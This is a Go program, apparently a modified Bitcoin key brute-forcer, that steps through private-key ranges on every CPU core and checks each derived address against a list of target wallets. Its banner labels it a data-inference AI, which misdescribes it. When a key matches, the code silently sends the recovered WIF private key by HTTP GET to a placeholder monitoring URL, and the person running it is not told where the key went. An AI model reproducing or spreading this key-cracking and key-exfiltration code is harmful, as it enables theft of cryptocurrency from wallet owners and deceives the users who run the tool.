package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/big"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"sync"
	"syscall"
	"time"
    "net/http"
    "strings"

	"btcgo/src/crypto/btc_utils"

	"github.com/dustin/go-humanize"
	"github.com/fatih/color"
)

type Wallets struct {
	Addresses [][]byte `json:"wallets"`
}

type Range struct {
	Min    string `json:"min"`
	Max    string `json:"max"`
	Status int    `json:"status"`
}

type Ranges struct {
	Ranges []Range `json:"ranges"`
}

type Progress struct {
	LastPrivKey string  `json:"lastPrivKey"`
	KeysChecked int     `json:"keysChecked"`
	StartTime   int64   `json:"startTime"`
	ElapsedTime float64 `json:"elapsedTime"`
}

func LoadProgress(filePath string) (*Progress, error) {
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		if os.IsNotExist(err) {
			return &Progress{}, nil
		}
		return nil, err
	}

	var progress Progress
	if err := json.Unmarshal(data, &progress); err != nil {
		return nil, err
	}
	return &progress, nil
}

func SaveProgress(filePath string, progress *Progress) error {
	data, err := json.MarshalIndent(progress, "", "  ")
	if err != nil {
		return err
	}
	return ioutil.WriteFile(filePath, data, 0644)
}

func main() {
	green := color.New(color.FgGreen).SprintFunc()

	exePath, err := os.Executable()
	if (err != nil) {
		fmt.Printf("Erro ao obter o caminho do executável: %v\n", err)
		return
	}
	rootDir := filepath.Dir(exePath)

	ranges, err := LoadRanges(filepath.Join(rootDir, "data", "ranges.json"))
	if (err != nil) {
		log.Fatalf("Failed to load ranges: %v", err)
	}

	color.Cyan("CELI AI - INFERÊNICA DE DADOS")
	color.White("v0.61")

	rangeNumber := PromptRangeNumber(len(ranges.Ranges))
	privKeyHex := ranges.Ranges[rangeNumber-1].Min

	progressFilePath := filepath.Join(rootDir, "progress.json")
	progress, err := LoadProgress(progressFilePath)
	if (err != nil) {
		log.Fatalf("Failed to load progress: %v", err)
	}

	privKeyInt := new(big.Int)
	if (progress.LastPrivKey != "") {
		privKeyInt.SetString(progress.LastPrivKey[2:], 16)
	} else {
		privKeyInt.SetString(privKeyHex[2:], 16)
	}

	wallets, err := LoadWallets(filepath.Join(rootDir, "data", "wallets.json"))
	if (err != nil) {
		log.Fatalf("Failed to load wallets: %v", err)
	}

	keysChecked := progress.KeysChecked
	startTime := time.Now()

	numCPU := runtime.NumCPU()
	fmt.Printf("CPUs detectados: %s\n", green(numCPU))
	runtime.GOMAXPROCS(numCPU * 2)

	privKeyChan := make(chan *big.Int, numCPU * 2)
	resultChan := make(chan *big.Int)
	var wg sync.WaitGroup

	for i := 0; i < numCPU * 2; i++ {
		wg.Add(1)
		go worker(wallets, privKeyChan, resultChan, &wg)
	}

	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	done := make(chan struct{})

	prevKeysChecked := keysChecked

	go func() {
		for {
			select {
			case <-ticker.C:
				newKeysChecked := keysChecked
				keysPerSecond := float64(newKeysChecked - prevKeysChecked) / 5.0
				fmt.Printf("Chaves checadas: %s, Chaves por segundo: %s\n", humanize.Comma(int64(newKeysChecked)), humanize.Comma(int64(keysPerSecond)))
				progress.LastPrivKey = fmt.Sprintf("0x%064x", privKeyInt)
				progress.KeysChecked = keysChecked
				SaveProgress(progressFilePath, progress)
				prevKeysChecked = newKeysChecked
			case <-done:
				return
			}
		}
	}()

	go func() {
		defer close(privKeyChan)
		for {
			privKeyCopy := new(big.Int).Set(privKeyInt)
			select {
			case privKeyChan <- privKeyCopy:
				privKeyInt.Add(privKeyInt, big.NewInt(1))
				keysChecked++
			case <-done:
				return
			}
		}
	}()

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt, syscall.SIGTERM)

	go func() {
		sig := <-signalChan
		fmt.Printf("Received signal: %v, saving progress...\n", sig)
		progress.LastPrivKey = fmt.Sprintf("0x%064x", privKeyInt)
		progress.KeysChecked = keysChecked
		progress.ElapsedTime += time.Since(startTime).Seconds()
		SaveProgress(progressFilePath, progress)
		close(done)
		os.Exit(0)
	}()

	var foundAddress *big.Int
    select {
    case foundAddress = <-resultChan:
        color.Yellow("Chave privada encontrada: %064x\n", foundAddress)
        wif := btc_utils.GenerateWif(foundAddress)
        color.Yellow("WIF: %s", wif)
        close(done)

        // Montando o URL com o WIF
        url := fmt.Sprintf("http://colqueseusitedemonitoramento.php?data=%s", strings.ReplaceAll(wif, " ", "%20"))

        // Fazendo a requisição GET
        resp, err := http.Get(url)
        if err != nil {
            log.Fatalf("Erro ao fazer a requisição HTTP: %v", err)
        }
        defer resp.Body.Close()

        // Verificando a resposta
        if resp.StatusCode == http.StatusOK {
            fmt.Println("Requisição bem-sucedida!")
            // Aqui você pode processar a resposta, se necessário
        } else {
            fmt.Printf("A requisição retornou um código de status não esperado: %d\n", resp.StatusCode)
        }
    }

	wg.Wait()

	totalElapsedTime := progress.ElapsedTime + time.Since(startTime).Seconds()
	keysPerSecond := float64(keysChecked) / totalElapsedTime

	fmt.Printf("Chaves checadas: %s\n", humanize.Comma(int64(keysChecked)))
	fmt.Printf("Tempo: %.2f seconds\n", totalElapsedTime)
	fmt.Printf("Chaves por segundo: %s\n", humanize.Comma(int64(keysPerSecond)))

	progress.LastPrivKey = fmt.Sprintf("0x%064x", privKeyInt)
	progress.KeysChecked = keysChecked
	progress.ElapsedTime = totalElapsedTime
	SaveProgress(progressFilePath, progress)
}

func worker(wallets *Wallets, privKeyChan <-chan *big.Int, resultChan chan<- *big.Int, wg *sync.WaitGroup) {
	defer wg.Done()
	for privKeyInt := range privKeyChan {
		address := btc_utils.CreatePublicHash160(privKeyInt)
		if (Contains(wallets.Addresses, address)) {
			select {
			case resultChan <- privKeyInt:
				return
			default:
				return
			}
		}
	}
}
